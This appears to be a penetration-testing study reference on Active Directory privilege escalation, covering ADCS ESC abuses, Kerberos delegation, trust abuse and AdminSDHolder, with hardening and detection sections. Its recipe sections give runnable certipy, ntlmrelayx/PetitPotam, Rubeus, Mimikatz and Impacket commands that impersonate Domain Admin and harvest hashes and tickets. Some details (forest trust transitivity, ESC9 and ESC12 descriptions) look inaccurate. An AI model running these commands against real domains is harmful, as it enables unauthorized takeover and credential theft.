## 1. Overview

Privilege escalation in Active Directory is the phase where an
authenticated user gains higher rights: local admin on a host, then
local admin on servers, then Domain Admin (or equivalent). AD has a
small number of high-yield escalation families: ADCS misconfigurations,
Kerberos delegation, domain trusts, and AdminSDHolder abuse.

**What this file covers:**

- ADCS (Active Directory Certificate Services) - ESC1 through ESC13.
- Kerberos delegation - unconstrained, constrained, RBCD.
- Domain and forest trusts - SID history, trust key extraction.
- AdminSDHolder - persistence and escalation via SDProp.
- Other escalation paths - GPO abuse, MSSQL, Exchange, SCOM, SCCM.

**Preconditions at a glance:**

| Technique | Requires | Yields |
|-----------|----------|--------|
| ADCS ESC1 | Enrollable template + client auth + SAN | Domain Admin (via cert) |
| ADCS ESC8 | CA with HTTP enrollment + relay | Domain Admin (via cert) |
| Unconstrained delegation | Admin on a delegation host + coercion | DA TGT cached, extractable |
| Constrained delegation | Service account with delegation + protocol transition | Impersonate any user to target service |
| RBCD | Write on target's `msDS-AllowedToActOnBehalfOfOtherIdentity` | Impersonate any user to target |
| SID History | DA on a trusted domain | Access in trusting domain |
| AdminSDHolder | Write on AdminSDHolder | Reapply ACL to all protected objects |

## 2. Reconnaissance / Enumeration

**Offensive - ADCS enumeration:**

    # certipy: full ADCS enumeration
    certipy find -u USER@corp.local -p PASS -dc-ip 10.10.10.10 -stdout -vulnerable

    # Expected output:
    # Certificate Authorities
    #   0
    #     CA Name                             : CORP-CA
    #     DNS Name                            : ca01.corp.local
    #     Web Enrollment                      : Enabled
    #     ...
    # Certificate Templates
    #   0
    #     Template Name                       : User
    #     Enabled                             : True
    #     Client Authentication               : True
    #     Enrollee Supplies Subject           : True
    #     [!] Vulnerabilities
    #       ESC1                              : Enrollable by Domain Users

**Offensive - delegation enumeration:**

    # Find unconstrained delegation hosts
    Get-DomainComputer -Unconstrained | Select dnshostname
    Get-DomainUser -Unconstrained | Select samaccountname

    # Find constrained delegation
    Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto
    Get-DomainComputer -TrustedToAuth | Select dnshostname,msds-allowedtodelegateto

    # Find RBCD
    Get-DomainComputer | Where-Object { $_."msds-allowedtoactonbehalfofotheridentity" } | Select dnshostname

    # BloodHound: delegation edges
    # Query: "Find Computers with Unconstrained Delegation"

**Offensive - trusts:**

    # Enumerate trusts
    nltest /domain_trusts
    Get-DomainTrust
    netexec ldap 10.10.10.10 -u USER -p PASS -M enum_trusts

    # Trust direction and transitivity
    Get-DomainTrust -Domain corp.local | Select SourceName,TargetName,TrustDirection,TrustType

**Offensive - AdminSDHolder:**

    # Check who can write to AdminSDHolder
    Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs

**Defensive - what to monitor:**

- Certificate enrollment with unusual SANs (Event 4886, 4887).
- Unconstrained delegation hosts (baseline).
- RBCD attribute modifications (5136).
- Trust changes (4706, 4707).
- AdminSDHolder ACL modifications (5136).

## 3. Common Attack Vectors

**ADCS (the highest-yield modern AD attack surface):**

| ESC | Description | Impact |
|-----|-------------|--------|
| ESC1 | Template allows SAN + client auth + low-priv enroll | Impersonate any user (incl. DA) |
| ESC2 | Template allows Any Purpose EKU | Same as ESC1 |
| ESC3 | Template allows enrollment agent | Enroll on behalf of any user |
| ESC4 | Template ACL allows write | Modify template to add ESC1 |
| ESC5 | PKI object ACL allows write | Modify CA/template config |
| ESC6 | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN in any request |
| ESC7 | CA ACL allows `ManageCA` / `ManageCertificates` | Approve pending, enable ESC6 |
| ESC8 | HTTP enrollment endpoint (Web Enrollment) | NTLM relay to CA |
| ESC9 | No security extension (`CT_FLAG_NO_SECURITY_EXTENSION`) | Weak cert mapping |
| ESC10 | Weak certificate mapping (`StrongCertificateBindingEnforcement`) | Impersonate via weak mapping |
| ESC11 | RPC enrollment without encryption | NTLM relay to ICPR |
| ESC12 | CA on a YubiHSM | Physical access only |
| ESC13 | Issuance policy linked to a group | Group membership via cert |

**Kerberos delegation:**

- **Unconstrained** - a host trusted to delegate any user to any service.
  Any user who authenticates to the host has their TGT cached in LSASS.
  Extract with Mimikatz `sekurlsa::tickets /export` or Rubeus `dump`.
- **Constrained** - a service trusted to delegate to specific services.
  With protocol transition (`TrustedToAuthForDelegation`), it can
  impersonate any user to the target service. Requires the service
  account's hash (for S4U2Self/S4U2Proxy).
- **RBCD (Resource-Based Constrained Delegation)** - the target object's
  `msDS-AllowedToActOnBehalfOfOtherIdentity` controls who can delegate
  to it. Requires write access on the attribute.

**Trusts:**

- Parent-child trusts within a forest are transitive and use the same
  KRBTGT-derived inter-realm key.
- Forest trusts are non-transitive and use a separate trust key.
- SID History injection - if a user in domain A has `Domain Admins` SID
  from domain B in their SIDHistory, they are DA in domain B.
- Trust key extraction - with DA in one domain, extract the trust key
  and forge inter-realm TGTs.

**AdminSDHolder:**

- SDProp runs every 60 minutes and reapplies AdminSDHolder ACL to all
  protected objects (Domain Admins, Enterprise Admins, etc.).
- An attacker with write on AdminSDHolder grants themselves rights that
  get reapplied to all protected objects - persistent DA.

**Other escalation paths:**

- **GPO abuse** - write access on a GPO linked to an OU with privileged
  computers.
- **MSSQL** - `sysadmin` on a SQL server where a service account is DA.
- **Exchange** - `Organization Management` group has DCSync-equivalent
  rights in many environments.
- **SCCM** - `Full Administrator` on SCCM gives code execution on all
  managed hosts.
- **SCOM** - `Operations Manager` gives access to all managed hosts.
- **DNS Admins** - can load a DLL on a DC (DLL injection in dns.exe).

## 4. Exploitation Recipes

**ADCS ESC1 - impersonate Domain Admin:**

    # 1. Find a vulnerable template
    certipy find -u USER@corp.local -p PASS -dc-ip 10.10.10.10 -vulnerable -stdout

    # 2. Request a certificate as Administrator with an arbitrary SAN
    certipy req -u USER@corp.local -p PASS -ca CORP-CA -template User \
      -upn Administrator@corp.local -dc-ip 10.10.10.10

    # Expected output:
    # [*] Requesting certificate via RPC
    # [*] Successfully requested certificate
    # [*] Got certificate with UPN 'Administrator@corp.local'
    # [*] Saved certificate and private key to 'administrator.pfx'

    # 3. Authenticate with the certificate (PKINIT)
    certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

    # Expected output:
    # [*] Using principal: administrator@corp.local
    # [*] Trying to get TGT...
    # [*] Got TGT
    # [*] Saved credential cache to 'administrator.ccache'
    # [*] Trying to retrieve NT hash for 'administrator'
    # [*] Got hash for 'administrator@corp.local': aad3b435...:<NTLM_HASH>

**ADCS ESC8 - relay to HTTP enrollment:**

    # 1. Check for Web Enrollment (http://ca01.corp.local/certsrv/)
    # 2. Start ntlmrelayx targeting the enrollment endpoint
    ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
      -smb2support --adcs --template DomainController

    # 3. Coerce a DC to authenticate to the attacker
    PetitPotam.py -d corp.local -u USER -p PASS 10.10.14.5 10.10.10.10

    # Expected output in ntlmrelayx:
    # [*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
    # [*] GOT CERTIFICATE! ID 0x...
    # [*] Writing PKCS#12 certificate to ./DC01.pfx

    # 4. Authenticate with the DC certificate
    certipy auth -pfx DC01.pfx -dc-ip 10.10.10.10

    # Expected: Administrator NT hash via UnPAC-the-hash.

**Unconstrained delegation - harvest DA TGT:**

    # 1. Compromise a host with unconstrained delegation (admin required)
    # 2. Coerce a DC to authenticate to that host
    PetitPotam.py -d corp.local -u USER -p PASS <UNCONSTRAINED_HOST> 10.10.10.10

    # 3. Extract the cached TGT from LSASS
    Rubeus.exe dump /service:krbtgt /nowrap

    # Or with Mimikatz
    sekurlsa::tickets /export

    # 4. Use the DC's TGT (DCSync via the DC machine account)
    Rubeus.exe ptt /ticket:<base64>
    secretsdump.py -k -no-pass corp.local/DC01$@dc01.corp.local

**Constrained delegation - impersonate any user to a target service:**

    # With the service account's NTLM hash
    getST.py -spn cifs/target.corp.local -impersonate Administrator \
      -hashes :<NTLM_HASH> corp.local/svc_deleg

    # Expected output:
    # [*] Getting TGT for user
    # [*] Impersonating Administrator
    # [*] Requesting S4U2self
    # [*] Requesting S4U2Proxy
    # [*] Saving ticket in Administrator@cifs_target.corp.local@CORP.LOCAL.ccache

    # Use the ticket
    export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
    psexec.py -k -no-pass target.corp.local

**RBCD - add a controlled machine as delegate:**

    # 1. Create a machine account (any domain user can by default)
    addcomputer.py -computer-name EVIL$ -computer-pass '<PASSWORD>' \
      corp.local/USER:PASS -dc-ip 10.10.10.10

    # 2. Set RBCD on the target
    rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write \
      corp.local/USER:PASS -dc-ip 10.10.10.10

    # 3. Request a ticket impersonating Administrator
    getST.py -spn cifs/target.corp.local -impersonate Administrator \
      -hashes :<EVIL$_HASH> corp.local/EVIL$

    # 4. Use the ticket
    export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
    psexec.py -k -no-pass target.corp.local

**SID History injection (requires DA in a trusted domain):**

    # With DA in child domain, inject Enterprise Admins SID into a user
    # (requires the forest root's SID)
    mimikatz # sid::patch
    mimikatz # sid::add /sam:USER /new:<ENTERPRISE_ADMINS_SID>
    mimikatz # sid::modify /sam:USER /new:<DOMAIN_SID>

    # Or with Impacket
    ticketer.py -nthash <KRBTGT_HASH> -domain-sid <CHILD_SID> \
      -extra-sid <ENTERPRISE_ADMINS_SID> -domain child.corp.local Administrator

**AdminSDHolder - persistence:**

    # Grant yourself GenericAll on AdminSDHolder
    Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
      -PrincipalIdentity USER -Rights All

    # Wait for SDProp (60 minutes) or trigger it manually
    # After SDProp, USER has GenericAll on all protected objects.

    # Verify
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser USER).objectsid }

## 5. Post-Exploitation

**After ADCS escalation:**

- The certificate is valid for the CA's lifetime (often 1-5 years).
- Use it to authenticate as the impersonated user (PKINIT).
- Extract the NT hash via UnPAC-the-hash (`certipy auth` does it).
- Persistence: keep the .pfx; it works until the CA is rebuilt or the
  certificate is revoked.

**After delegation abuse:**

- Unconstrained: harvest cached TGTs repeatedly; each new authentication
  caches a new TGT.
- Constrained: the service account hash is reusable until rotated.
- RBCD: the controlled machine account is the persistence; remove it
  carefully (it may be logged).

**After trust abuse:**

- SID History injection: persist via a user with the injected SID.
- Trust key extraction: forge inter-realm TGTs (Golden Ticket across
  the trust).

**After AdminSDHolder:**

- Persistent across password resets and re-ACLs (SDProp reapplies).
- Requires explicit removal from AdminSDHolder to remove.

**General:**

- Mark the new principal as owned in BloodHound.
- Re-run "Shortest Paths from Owned Principals".
- Look for additional ADCS templates, delegation edges, trust paths.

## 6. Risk Context

Privilege escalation in AD is where the attacker reaches Tier 0:

- ADCS ESC1 turns any domain user into Domain Admin with a single
  certificate request in vulnerable environments.
- Unconstrained delegation turns any admin host into a DA credential
  harvester.
- RBCD turns write access on a single attribute into full impersonation.
- Trust abuse turns a single-domain compromise into a forest compromise.
- AdminSDHolder gives persistence that survives cleanup attempts.

**Blast radius:** after escalation, the entire forest is compromised.
Certificates remain valid for years; KRBTGT hashes remain valid until
rotation.

**Why attacks succeed:**

- ADCS templates default to permissive enrollment.
- Unconstrained delegation is enabled by default on some roles.
- RBCD requires only write on one attribute.
- Trusts accumulate over years; SID filtering is often disabled.
- AdminSDHolder is rarely audited.

## 7. Root Causes

- **ADCS templates with `Enrollee Supplies Subject` + `Client Authentication`.**
  Default in many templates; enables ESC1.
- **Web Enrollment enabled on the CA.** Enables ESC8.
- **`EDITF_ATTRIBUTESUBJECTALTNAME2` set on the CA.** Enables ESC6.
- **Unconstrained delegation on servers.** Legacy Kerberos design.
- **RBCD attribute writable by non-admin principals.** Accumulated ACLs.
- **Trusts with SID filtering disabled.** Default in some configurations.
- **AdminSDHolder ACL writable by non-admin principals.** Accumulated ACLs.
- **No monitoring of certificate enrollment.** 4886/4887 rarely alerted.

## 8. Preventive Controls

**ADCS hardening:**

- Remove `Enrollee Supplies Subject` from templates that allow client
  authentication (blocks ESC1).
- Remove `Any Purpose` EKU from templates (blocks ESC2).
- Restrict enrollment agent templates (blocks ESC3).
- Audit template ACLs; remove write access from non-admin principals
  (blocks ESC4).
- Audit CA object ACLs (blocks ESC5).
- Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` from the CA (blocks ESC6).
- Restrict `ManageCA` and `ManageCertificates` (blocks ESC7).
- Disable Web Enrollment or enable HTTPS + require authentication +
  channel binding (blocks ESC8).
- Enable `CT_FLAG_NO_SECURITY_EXTENSION` protection (blocks ESC9).
- Set `StrongCertificateBindingEnforcement = 2` on all DCs (blocks ESC10).
- Require RPC encryption on the CA (blocks ESC11).
- Audit issuance policies for group links (blocks ESC13).

**Delegation hardening:**

- Remove unconstrained delegation; migrate to constrained or RBCD.
- Add privileged accounts to `Protected Users` (blocks delegation).
- Mark Tier 0 accounts as `Account is sensitive and cannot be delegated`.
- Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` on all objects.
- Remove write access to the RBCD attribute from non-admin principals.

**Trust hardening:**

- Enable SID filtering on all external and forest trusts.
- Enable `Quarantine` on forest trusts.
- Rotate trust keys regularly.
- Audit trust direction and transitivity quarterly.

**AdminSDHolder hardening:**

- Audit ACL on AdminSDHolder quarterly.
- Remove `GenericAll`, `WriteDacl`, `WriteOwner` from non-admin
  principals.
- Enable `AdminSDHolder` change alerts.

## 9. Detection Controls

**ADCS abuse:**

- Event 4886 (certificate services: certificate issued) - baseline and
  alert on unusual templates or SANs.
- Event 4887 (certificate services: certificate request approved).
- CA audit log on templates with unusual SANs.
- Event 4768 with certificate-based authentication from an unexpected
  source.

**Delegation abuse:**

- Event 4624 with `Logon Type 3` on an unconstrained delegation host.
- Event 4769 with S4U2Self / S4U2Proxy patterns (`Transited Services`
  field).
- Event 5136 (directory service object modification) on
  `msDS-AllowedToActOnBehalfOfOtherIdentity`.

**Trust abuse:**

- Event 4706 (trust created), 4707 (trust removed).
- Event 4624 with a SID from a trusted domain but an unexpected source.
- Event 4768 with an inter-realm TGT from an unusual source.

**AdminSDHolder:**

- Event 5136 (directory service object modification) on
  `CN=AdminSDHolder,CN=System`.
- Event 4780 (ACL set on admin accounts).
- Event 4738 (user account changed) - SDProp reapplication.

**General:**

- Honeytokens: fake ADCS templates, fake delegation hosts, fake trust
  objects. Any interaction is high-confidence.

## 10. Verification

**Offensive - did escalation succeed?**

- ADCS: certificate obtained; `certipy auth` returns a TGT and NT hash.
- Unconstrained delegation: DA TGT extracted; DCSync with it succeeds.
- Constrained delegation: service ticket for the impersonated user;
  access to the target service.
- RBCD: ticket for the impersonated user; access to the target service.
- Trust: inter-realm TGT accepted by the trusting domain.
- AdminSDHolder: after SDProp, the granted right is effective on
  protected objects.

**Defensive - are controls effective?**

- Test ESC1: enrollment on vulnerable templates fails.
- Test ESC8: Web Enrollment is disabled or requires HTTPS + auth.
- Test unconstrained delegation: zero hosts with unconstrained
  delegation (or documented exceptions).
- Test RBCD: `msDS-AllowedToActOnBehalfOfOtherIdentity` is writable only
  by admins.
- Test trust: SID filtering enabled on all trusts.
- Test AdminSDHolder: only admins can write.

## 11. OSCP Notes

- ADCS is rare in OSCP (the exam machines are usually simpler), but
  appears in OSCP-like labs (Proving Grounds, Hack The Box Pro Labs).
- Delegation and trusts are common in OSCP Pro Labs; practice with
  `getST.py`, `rbcd.py`, and Mimikatz `sekurlsa::tickets`.
- AdminSDHolder and SID History are advanced topics; unlikely in OSCP
  but essential for OSCP-like labs.
- **Capture screenshots** of:
  - The vulnerable ADCS template in `certipy find -vulnerable` output.
  - The certificate request with the arbitrary SAN.
  - The `certipy auth` output with the TGT and NT hash.
  - The RBCD write and the resulting ticket.
- The `> [!IMPORTANT]` OSCP reporting note applies to the privilege
  escalation step.

## 12. Production Notes

- ADCS is the single highest-yield modern AD attack surface. In mature
  environments, prioritize ADCS enumeration over Kerberoasting.
- Unconstrained delegation is rare in modern environments but common in
  legacy ones; check every host and user.
- RBCD attacks are subtle: they require write on one attribute and leave
  a small footprint. Monitor 5136 on
  `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Trust abuse is rare in single-domain environments; focus on multi-
  domain forests and forest trusts.
- AdminSDHolder persistence survives password rotation and re-ACLs;
  detection requires monitoring the AdminSDHolder object itself.
- Certificate-based persistence (post-ADCS) lasts for the certificate's
  lifetime (often 1-5 years). Revocation is the only mitigation.

## 13. References

**Microsoft documentation:**

- Active Directory Certificate Services - https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview
- Kerberos constrained delegation - https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview
- How Domain Controllers Are Supported in a Forest - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/forest-design-models

**MITRE ATT&CK:**

- Privilege Escalation - Domain Policy Modification (T1484) - https://attack.mitre.org/techniques/T1484/
- Credential Access - Steal or Forge Authentication Certificates (T1649) - https://attack.mitre.org/techniques/T1649/
- Defense Evasion - Use Alternate Authentication Material (T1550) - https://attack.mitre.org/techniques/T1550/

**Tools:**

- Certipy - https://github.com/ly4k/Certipy - ADCS enumeration and exploitation
- Certify - https://github.com/GhostPack/Certify - Windows ADCS enumeration
- Rubeus - https://github.com/GhostPack/Rubeus - Kerberos toolkit
- Impacket - https://github.com/fortra/impacket - getST, rbcd, addcomputer, ticketer
- Mimikatz - https://github.com/gentilkiwi/mimikatz - delegation, SID history

**Research:**

- SpecterOps - Certified Pre-Owned - https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
- ADSecurity.org - Unconstrained delegation - https://adsecurity.org/?p=1667
- The Hacker Recipes - ADCS - https://www.thehacker.recipes/ad/movement/adcs
- The Hacker Recipes - Delegation - https://www.thehacker.recipes/ad/movement/kerberos/delegations
